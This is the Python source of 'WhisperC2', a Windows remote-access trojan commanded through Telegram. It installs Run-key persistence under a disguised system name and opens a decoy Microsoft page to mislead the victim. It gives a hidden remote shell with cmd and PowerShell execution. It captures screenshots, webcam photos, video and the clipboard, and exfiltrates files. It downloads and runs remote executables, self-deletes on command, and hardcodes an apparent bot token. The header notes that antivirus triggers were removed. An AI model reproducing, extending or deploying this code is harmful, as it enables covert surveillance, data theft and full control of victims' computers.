#!/usr/bin/env python3
# =============================================================================
# 🌈 WhisperC2 Agent – Final Build (v1.1) – Keylogger & AV Triggers Removed
#    ✅ PeekNamedPipe deadlock fix
#    ✅ Markdown rendering (parse_mode='Markdown') + sanitise_markdown()
#    ✅ DEX cleanup via MoveFileExW (MOVEFILE_DELAY_UNTIL_REBOOT)
#    ✅ Shell encoding uses system OEM code page
#    ✅ Persistence skipped when running as script (non‑frozen)
#    ✅ Auto‑creates dedicated forum topic in Eclipse‑C2 supergroup
#    ❌ Keylogger & pynput permanently removed
# =============================================================================
import cv2, time, telebot, platform, subprocess, threading
import os, re, socket, sys, io, traceback, webbrowser, locale
import shutil, winreg, ctypes, requests
from datetime import datetime
from pathlib import Path
import mss
from PIL import Image
from urllib.parse import urlparse
import random, string

# -----------------------------------------------------------------------------
# 🎨 Hardcoded Configuration – your exact values
# -----------------------------------------------------------------------------
BOT_API_KEY = "8318891177:AAG8SB7YI_YAQHL2cszd4fKFK8Xp9-7u-JY"
OPERATOR_CHAT_ID = 5178265082
GROUP_CHAT_ID = -1003972714956
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# 🔒 Single‑instance mutex
# -----------------------------------------------------------------------------
MUTEX_NAME = "Global\\WhisperC2_Mutex"
mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
if ctypes.windll.kernel32.GetLastError() == 183:
    sys.exit(0)

# -----------------------------------------------------------------------------
# 📝 Runtime log buffer → sent to operator before decoy URL
# -----------------------------------------------------------------------------
log_lines = []

def log(msg: str) -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_lines.append(f"[{timestamp}] {msg}")
    print(f"🌟 {msg}")

def send_log_to_telegram(bot_instance) -> None:
    if not log_lines:
        return
    try:
        log_text = "\n".join(log_lines)
        bio = io.BytesIO(log_text.encode('utf-8'))
        bio.name = "Execution_log.txt"
        bio.seek(0)
        bot_instance.send_document(OPERATOR_CHAT_ID, bio)
        log("📤 Execution log delivered to operator")
    except Exception as e:
        print(f"❌ Failed to send log: {e}")

# -----------------------------------------------------------------------------
# 🤖 Bot instance
# -----------------------------------------------------------------------------
bot = telebot.TeleBot(BOT_API_KEY)

# -----------------------------------------------------------------------------
# 🆔 Agent identification
# -----------------------------------------------------------------------------
appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
os.makedirs(agents_dir, exist_ok=True)

def get_system_id() -> str:
    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
    if '\\' in raw_user:
        username = raw_user.split('\\', 1)[1]
    else:
        username = raw_user
    return f"{hostname}/{username}"

SYSTEM_ID = get_system_id()

# -----------------------------------------------------------------------------
# 🔧 Persistence
# -----------------------------------------------------------------------------
def install_persistence() -> bool:
    if not getattr(sys, 'frozen', False):
        log("⚠️ Persistence skipped – running as script (not compiled EXE)")
        return False
    try:
        dest_path = Path(agents_dir) / 'SystemSettingsBroker.exe'
        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
        if current.resolve() == dest_path.resolve():
            return True
        if not dest_path.exists():
            try:
                shutil.copy2(current, dest_path)
            except PermissionError:
                log("⏩ Copy skipped – destination exists or is locked.")
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'System Settings Broker', 0,
                              winreg.REG_SZ, str(dest_path))
        return True
    except Exception as e:
        log(f"💥 Persistence error: {traceback.format_exc()}")
        return False

def self_destruct() -> None:
    log("💣 Self‑destruct sequence started")
    try:
        persistent = Path(agents_dir) / 'SystemSettingsBroker.exe'
        if persistent.exists():
            persistent.unlink()
    except Exception as e:
        log(f"⚠️ Failed to remove persistent file: {e}")
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            try:
                winreg.DeleteValue(key, 'System Settings Broker')
            except FileNotFoundError:
                pass
    except Exception as e:
        log(f"⚠️ Registry cleanup error: {e}")
    try:
        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
        if current.exists():
            MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
            ctypes.windll.kernel32.MoveFileExW(str(current), None,
                                               MOVEFILE_DELAY_UNTIL_REBOOT)
            log("🗑️ Self‑deletion scheduled for next reboot")
    except Exception as e:
        log(f"⚠️ Self‑delete scheduling error: {e}")

# -----------------------------------------------------------------------------
# 🧹 Markdown sanitisation
# -----------------------------------------------------------------------------
def sanitise_markdown(text: str) -> str:
    return text.replace('```', "'''")

# -----------------------------------------------------------------------------
# 💬 Interactive Shell (PeekNamedPipe fix, OEM encoding)
# -----------------------------------------------------------------------------
shell_active = False
shell_stdin = None
shell_process = None

def spawn_shell() -> bool:
    global shell_active, shell_stdin, shell_process
    if shell_active:
        return True
    try:
        sa = ctypes.wintypes.SECURITY_ATTRIBUTES()
        sa.nLength = ctypes.sizeof(sa); sa.bInheritHandle = True; sa.lpSecurityDescriptor = None
        h_stdin_r, h_stdin_w = ctypes.wintypes.HANDLE(), ctypes.wintypes.HANDLE()
        h_stdout_r, h_stdout_w = ctypes.wintypes.HANDLE(), ctypes.wintypes.HANDLE()
        if not ctypes.windll.kernel32.CreatePipe(ctypes.byref(h_stdin_r), ctypes.byref(h_stdin_w), ctypes.byref(sa), 0):
            return False
        if not ctypes.windll.kernel32.CreatePipe(ctypes.byref(h_stdout_r), ctypes.byref(h_stdout_w), ctypes.byref(sa), 0):
            return False
        si = ctypes.wintypes.STARTUPINFO(); si.cb = ctypes.sizeof(si); si.dwFlags = 0x100
        si.hStdInput = h_stdin_r; si.hStdOutput = h_stdout_w; si.hStdError = h_stdout_w
        pi = ctypes.wintypes.PROCESS_INFORMATION()
        cmd_line = ctypes.create_unicode_buffer("cmd.exe")
        if not ctypes.windll.kernel32.CreateProcessW(None, cmd_line, None, None, True, 0x08000000, None, None, ctypes.byref(si), ctypes.byref(pi)):
            return False
        ctypes.windll.kernel32.CloseHandle(h_stdin_r); ctypes.windll.kernel32.CloseHandle(h_stdout_w); ctypes.windll.kernel32.CloseHandle(pi.hThread)
        shell_stdin = h_stdin_w; shell_process = pi.hProcess; shell_active = True
        threading.Thread(target=shell_reader, args=(h_stdout_r,), daemon=True).start()
        return True
    except Exception as e:
        log(f"💥 Shell spawn error: {e}")
        return False

def shell_reader(h_stdout_r) -> None:
    buf = ctypes.create_string_buffer(4096)
    lpBytesAvail = ctypes.wintypes.DWORD()
    code_page = locale.getpreferredencoding(do_setlocale=False)
    while shell_active:
        if not ctypes.windll.kernel32.PeekNamedPipe(h_stdout_r, None, 0, None, ctypes.byref(lpBytesAvail), None):
            break
        if lpBytesAvail.value > 0:
            n = ctypes.wintypes.DWORD()
            if ctypes.windll.kernel32.ReadFile(h_stdout_r, buf, 4096, ctypes.byref(n), None):
                if n.value > 0:
                    output = buf.raw[:n.value].decode(code_page, errors='replace')
                    safe_output = sanitise_markdown(output)
                    for chunk in [safe_output[i:i+3900] for i in range(0, len(safe_output), 3900)]:
                        try: bot.send_message(OPERATOR_CHAT_ID, f"```\n{chunk}\n```", parse_mode='Markdown')
                        except:
                            try: bot.send_message(OPERATOR_CHAT_ID, chunk, parse_mode=None)
                            except: pass
            else: break
        else: time.sleep(0.1)

def kill_shell() -> None:
    global shell_active, shell_stdin, shell_process
    if not shell_active: return
    shell_active = False
    try: ctypes.windll.kernel32.TerminateProcess(shell_process, 0); ctypes.windll.kernel32.CloseHandle(shell_stdin); ctypes.windll.kernel32.CloseHandle(shell_process)
    except: pass
    shell_stdin = None; shell_process = None

def write_shell(cmd: str) -> None:
    if shell_active and shell_stdin:
        cmd_line = (cmd + "\r\n").encode(); n = ctypes.wintypes.DWORD()
        ctypes.windll.kernel32.WriteFile(shell_stdin, cmd_line, len(cmd_line), ctypes.byref(n), None)

# -----------------------------------------------------------------------------
# 📸 Screenshot
# -----------------------------------------------------------------------------
def take_screenshot() -> tuple:
    try:
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1])
            pil_img = Image.frombytes('RGB', img.size, img.rgb)
            filename = f"screenshot_{int(time.time())}.png"
            pil_img.save(filename, format='PNG')
            return filename, None
    except Exception as e: return None, f"❌ Screenshot error: {e}"

# -----------------------------------------------------------------------------
# 📷 Webcam (cv2 kept only for this – used when commands are invoked)
# -----------------------------------------------------------------------------
def list_webcams() -> str:
    available = []
    for i in range(5):
        cap = cv2.VideoCapture(i)
        if cap.read()[0]: available.append(str(i))
        cap.release()
    return "📷 Webcams: " + ", ".join(available) if available else "❌ No webcam found"

def take_photo(index: int = 0) -> tuple:
    try:
        cap = cv2.VideoCapture(index)
        if not cap.isOpened(): return None, "❌ Webcam not available"
        ret, frame = cap.read(); cap.release()
        if not ret or frame is None: return None, "❌ Failed to capture image"
        filename = f"webcam_{int(time.time())}.jpg"
        cv2.imwrite(filename, frame)
        return filename, None
    except Exception as e: return None, f"❌ Photo error: {e}"

def record_video(index: int = 0, duration: int = 5, fps: int = 5) -> tuple:
    try:
        cap = cv2.VideoCapture(index)
        if not cap.isOpened(): return None, "❌ Webcam not available"
        frames = []; start = time.time()
        while time.time() - start < duration:
            ret, frame = cap.read()
            if ret and frame is not None: frames.append(frame)
            time.sleep(1.0 / fps)
        cap.release()
        if not frames: return None, "❌ No frames captured"
        h, w, _ = frames[0].shape; fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        filename = f"video_{int(time.time())}.mp4"
        out = cv2.VideoWriter(filename, fourcc, fps, (w, h))
        if not out.isOpened(): return None, "❌ Failed to initialize video writer"
        for frame in frames: out.write(frame)
        out.release()
        return filename, None
    except Exception as e: return None, f"❌ Video error: {e}"

# -----------------------------------------------------------------------------
# ⚙️ System command helpers
# -----------------------------------------------------------------------------
def execute_sys_command(cmd: str) -> str:
    try:
        output = subprocess.getstatusoutput(cmd)[1]
        return output[:4000] if len(output) > 4000 else output
    except Exception as e: return f"❌ Error: {e}"

def execute_ps_command(cmd: str) -> str:
    try:
        output = subprocess.getstatusoutput(f"powershell -Command {cmd}")[1]
        return output[:4000] if len(output) > 4000 else output
    except Exception as e: return f"❌ Error: {e}"

def get_clipboard_content() -> str:
    try:
        import win32clipboard
        win32clipboard.OpenClipboard(); data = win32clipboard.GetClipboardData(); win32clipboard.CloseClipboard()
        return data
    except ImportError: return "❌ pywin32 not installed"
    except Exception as e: return f"❌ Clipboard error: {e}"

# -----------------------------------------------------------------------------
# 📂 File operations
# -----------------------------------------------------------------------------
def view_file(path: str) -> str:
    try:
        if not os.path.exists(path): return f"❌ File not found: {path}"
        if os.path.isdir(path): return "📁 Path is a directory"
        size = os.path.getsize(path)
        if size > 10 * 1024 * 1024: return f"⚠️ File too large ({size/1024/1024:.1f} MB)"
        with open(path, 'r', encoding='utf-8', errors='ignore') as f: content = f.read()
        if len(content) > 4000: content = content[:4000] + "\n... (truncated)"
        return content
    except Exception as e: return f"❌ Error reading file: {e}"

def download_file_from_path(path: str) -> tuple:
    if not os.path.exists(path): return None, f"❌ File not found: {path}"
    if os.path.isdir(path): return None, "📁 Path is a directory"
    if os.path.getsize(path) > 50 * 1024 * 1024: return None, "⚠️ File too large (>50 MB)"
    return path, None

# -----------------------------------------------------------------------------
# ⬇️ DEX with MoveFileExW cleanup
# -----------------------------------------------------------------------------
def download_file_from_url(url: str, dest_path: str) -> bool:
    try:
        resp = requests.get(url, stream=True, timeout=30); resp.raise_for_status()
        with open(dest_path, 'wb') as f:
            for chunk in resp.iter_content(chunk_size=8192):
                if chunk: f.write(chunk)
        return True
    except Exception as e: log(f"❌ Download error: {e}"); return False

def dex_command(url: str, *args: str) -> str:
    if not url: return "Usage: dex <url> [arguments...]"
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'): return "❌ Invalid URL scheme"
    rand_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    ext = ".exe"
    orig_name = os.path.basename(parsed.path)
    if '.' in orig_name: ext = os.path.splitext(orig_name)[1] or ".exe"
    dest_path = os.path.join(os.environ.get('TEMP', os.environ.get('TMP', os.curdir)), rand_name + ext)
    log(f"⬇️ Downloading {url} to {dest_path}")
    if not download_file_from_url(url, dest_path): return f"❌ Failed to download {url}"
    try:
        cmd_line = f'"{dest_path}"'
        if args: cmd_line += ' ' + ' '.join(args)
        log(f"⚡ Executing: {cmd_line}")
        CREATE_NO_WINDOW = 0x08000000
        proc = subprocess.Popen(cmd_line, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=CREATE_NO_WINDOW)
        try: stdout, stderr = proc.communicate(timeout=15)
        except subprocess.TimeoutExpired: proc.kill(); stdout, stderr = proc.communicate(); return "⏰ Process timed out after 15 seconds"
        output = (stdout.strip() + "\n" if stdout else "") + (stderr.strip() if stderr else "")
        if not output: output = "[No output]"
        return f"✅ Executed: {dest_path}\nExit code: {proc.returncode}\nOutput:\n{output}"
    except Exception as e: log(f"💥 dex execution error: {e}"); return f"❌ Execution failed: {e}"
    finally:
        try:
            MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
            ctypes.windll.kernel32.MoveFileExW(dest_path, None, MOVEFILE_DELAY_UNTIL_REBOOT)
        except: pass

# -----------------------------------------------------------------------------
# 🎮 Command dispatcher (keylogger commands removed)
# -----------------------------------------------------------------------------
def execute_command(cmd_line: str) -> tuple:
    parts = cmd_line.strip().split(' ', 1)
    cmd = parts[0].lower(); args = parts[1] if len(parts) > 1 else ""
    if cmd in ("ping", "start", "scan"): return f"🟢 {SYSTEM_ID} online\n{platform.system()} {platform.release()}", None
    elif cmd == "shell":
        if args: return sanitise_markdown(execute_sys_command(args)), None
        else:
            if spawn_shell(): return "💬 Interactive shell started. Send commands directly. Type `exit` to close.", None
            else: return "❌ Failed to spawn shell.", None
    elif cmd in ("powershell", "pow"):
        if not args: return "Usage: powershell <command>", None
        return sanitise_markdown(execute_ps_command(args)), None
    elif cmd == "screenshot":
        path, err = take_screenshot()
        return ("📸 Screenshot captured", path) if path else (f"❌ Error: {err}", None)
    elif cmd == "webcams": return list_webcams(), None
    elif cmd == "photo":
        idx = int(args) if args.isdigit() else 0
        path, err = take_photo(idx)
        return ("📷 Photo captured", path) if path else (f"❌ Error: {err}", None)
    elif cmd == "video":
        try:
            params = args.split(); idx = int(params[0]) if len(params) > 0 else 0
            dur = int(params[1]) if len(params) > 1 else 5; fps = int(params[2]) if len(params) > 2 else 5
        except: return "Usage: video <index> <duration> <fps>", None
        path, err = record_video(idx, dur, fps)
        return ("🎥 Video recorded", path) if path else (f"❌ Error: {err}", None)
    elif cmd in ("clipboard", "clip"): return get_clipboard_content(), None
    elif cmd in ("download", "downloadfile"):
        filepath = args.strip(); path, err = download_file_from_path(filepath)
        if err: return err, None
        return f"⬆️ Uploading {filepath}", path
    elif cmd == "delete":
        try: os.remove(args.strip()); return f"🗑️ Deleted: {args.strip()}", None
        except Exception as e: return f"❌ Delete failed: {e}", None
    elif cmd in ("view", "viewfile"): return sanitise_markdown(view_file(args.strip())), None
    elif cmd == "dex":
        space_idx = args.find(' ')
        if space_idx == -1: url = args; extra_args = ()
        else: url = args[:space_idx]; extra_args = tuple(args[space_idx+1:].split())
        return sanitise_markdown(dex_command(url, *extra_args)), None
    elif cmd == "die":
        log("💀 Die command received – initiating self‑destruct")
        try: send_log_to_telegram(bot)
        except: pass
        self_destruct()
        return "💀 Shutting down... All traces removed.", None
    elif cmd == "off":
        try: subprocess.run(["shutdown", "/s", "/t", "0", "/f"], check=True)
        except Exception as e: return f"❌ Shutdown failed: {e}", None
        return "🔌 Shutting down PC...", None
    else: return f"❓ Unknown command: {cmd}", None

# -----------------------------------------------------------------------------
# 📨 Telegram handler – replies inside agent's forum topic
# -----------------------------------------------------------------------------
TOPIC_ID = None

def message_handler(message) -> None:
    if message.from_user.id != OPERATOR_CHAT_ID: return
    if hasattr(message, 'message_thread_id') and message.message_thread_id is None: return
    text = message.text.strip()
    if not text: return
    if shell_active:
        clean = text[1:] if text.startswith('/') else text
        if clean.lower() == "exit":
            kill_shell(); bot.reply_to(message, "💬 Shell closed.", parse_mode='Markdown', message_thread_id=TOPIC_ID)
        elif clean.lower().startswith("die"): kill_shell(); execute_command("die")
        else: write_shell(clean)
        return
    if text.startswith('/'): text = text[1:]
    target_id = None; command_portion = text
    if text.upper().startswith("ALL:"): target_id = "ALL"; command_portion = text[4:].strip()
    else:
        for known_id in [SYSTEM_ID]:
            if text.upper().startswith(known_id.upper() + ":"): target_id = known_id; command_portion = text[len(known_id)+1:].strip(); break
    if target_id is None: target_id = "ALL"
    if target_id != "ALL" and target_id.upper() != SYSTEM_ID.upper(): return
    response, file_path = execute_command(command_portion)
    if command_portion.startswith("die"):
        bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', message_thread_id=TOPIC_ID); os._exit(0)
    safe_response = sanitise_markdown(response)
    try: bot.reply_to(message, f"```\n{safe_response}\n```", parse_mode='Markdown', message_thread_id=TOPIC_ID)
    except: bot.reply_to(message, safe_response, parse_mode=None, message_thread_id=TOPIC_ID)
    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as f:
                if file_path.endswith(('.png', '.jpg', '.jpeg')): bot.send_photo(message.chat.id, f, message_thread_id=TOPIC_ID)
                elif file_path.endswith(('.mp4', '.avi')): bot.send_video(message.chat.id, f, message_thread_id=TOPIC_ID)
                else: bot.send_document(message.chat.id, f, message_thread_id=TOPIC_ID)
        except Exception as e: log(f"❌ File send error: {e}")
        finally:
            try: os.remove(file_path)
            except: pass

bot.message_handler(func=lambda msg: True)(message_handler)

# -----------------------------------------------------------------------------
# 🚀 Main
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    log("🚀 Agent starting")
    if not install_persistence(): log("⚠️ Persistence installation failed – continuing anyway.")
    else: log("💾 Persistence installed")
    log(f"🆔 Agent ID: {SYSTEM_ID}")
    try:
        new_topic = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0x6FB9F0)
        TOPIC_ID = new_topic.message_thread_id
        log(f"📁 Created forum topic #{TOPIC_ID} in Eclipse‑C2")
    except Exception as e: log(f"⚠️ Could not create forum topic: {e}")
    send_log_to_telegram(bot)
    webbrowser.open(DECOY_URL)
    log("🔁 Entering main polling loop")
    while True:
        try: bot.polling(none_stop=True, timeout=30)
        except Exception as e: log(f"⚠️ Polling error: {e}. Retrying in 10s..."); time.sleep(10)
